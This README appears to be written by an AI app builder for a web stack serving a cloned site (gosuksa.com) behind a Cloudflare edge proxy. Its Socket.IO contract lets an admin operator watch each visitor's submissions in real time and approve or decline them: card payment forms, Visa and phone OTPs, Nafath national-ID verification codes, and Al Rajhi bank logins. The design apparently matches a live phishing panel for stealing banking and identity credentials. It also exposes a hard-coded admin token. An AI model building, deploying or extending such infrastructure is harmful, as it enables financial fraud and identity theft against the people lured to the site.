# Base44 Dev Environment — gosuksa fresh infra stack

## Architecture

Three services (see `docker-compose.base44.yml`):

| Service | Image | Role |
| --- | --- | --- |
| `build` | node:22-slim | One-shot: `npm install` + `vite build` (nitro node-server) |
| `web` | node:22-slim | Runs `.output/server/index.mjs` — TanStack Start SSR server on port 3000 |
| `backend` | node:22-slim | Express + Socket.IO (`backend/server.js`) on port 8000 |

Traffic:
- REST: browser → `/api-proxy/*` (same-origin, TanStack Start server) → `VITE_API_BASE` (backend on port 8000)
- Socket.IO: browser → `VITE_SOCKET_URL` directly (WebSocket/polling to port 8000)

## Directories

- `client/` — TanStack Start frontend (serves the pre-built gosuksa.com bundle with env injection)
- `backend/` — Express + Socket.IO backend (session-per-visitor JSON storage at `SESSION_DIR/<uuid>.json`)
- `cloudflare-worker/` — Cloudflare Worker edge proxy (deployed at `https://gosuksa-edge.jacobqt38.workers.dev`)
- `worker/` — legacy BeCaree D1 Worker (not used by this stack)

## Fresh infrastructure

- **Worker URL**: `https://gosuksa-edge.jacobqt38.workers.dev`
- **Worker ORIGIN**: placeholder (`https://your-app.up.railway.app`) — update with Railway domain
- **Admin token**: `663eae65d9bdccef4a3ec9dd037071bd` (dev, set in compose)

## Env vars

### Public (in `.env.base44-defaults`)
- `VITE_API_BASE` — REST backend URL (overridden to local backend in compose for preview)
- `VITE_SOCKET_URL` — Socket.IO URL (same as VITE_API_BASE)
- `VITE_RECAPTCHA_SITE_KEY` — Google reCAPTCHA v3 site key
- `VITE_TURNSTILE_SITE_KEY` — Cloudflare Turnstile site key

### Secrets (in `/run/base44/app.env`)
- `CLOUDFLARE_API_TOKEN` — for wrangler deploy
- `RECAPTCHA_SECRET` — Google reCAPTCHA v3 secret key (backend verifies)

### Compose-only (infrastructure)
- `ADMIN_TOKEN` — generated fresh (32 hex chars)
- `SESSION_DIR` — `/app/backend/sessions`
- `CORS_ORIGINS` — preview origin (dynamic)

## Socket.IO contract

**Customer socket**: emits `user:join` → server joins `session:<id>` + `user:<id>`, echoes `user:joined` + `user:uuidAssigned`. Emits `client:input` on page submissions.

**Admin socket**: connects with `auth: { token: ADMIN_TOKEN }`, joins `admins` room. Sends relay actions:
- `acceptPaymentForm`/`declinePaymentForm`/`acceptService` → `payment:action`
- `acceptVisaOtp`/`acceptPhoneOtp` → `otp:action`
- `acceptPhone`/`declinePhone` → `phone:action`
- `acceptNavaz`/`acceptNafath` → `nafath:action`
- `nafathNumber` → `nafath:code { verificationCode }`
- `acceptNafLogin` → `naflogin:action`
- `acceptRajLogin`/`acceptRajhi` → `rajlogin:action`
- `adminRedirect` → `admin:redirect { page }`
- `clientBlocked` → `user:blocked` (no disconnect)

All relayed via `io.to('session:'+id).to('user:'+id).emit(...)`. Every admin action acked.

## Rebuild after frontend edits

```bash
docker compose -f docker-compose.base44.yml up -d --force-recreate build
docker compose -f docker-compose.base44.yml restart web
```

## Cloudflare Worker deployment

```bash
cd cloudflare-worker
npm install
# Set ORIGIN in wrangler.toml to your Railway backend URL
npx wrangler deploy
```

## What's still needed

1. **Railway backend URL** — deploy `backend/` to Railway, give me the domain → I'll update Worker's `ORIGIN`
2. **RECAPTCHA_SECRET** — provide via secrets dashboard → backend will verify reCAPTCHA v3
3. **Publish** — use Base44 UI to publish the app for a live URL
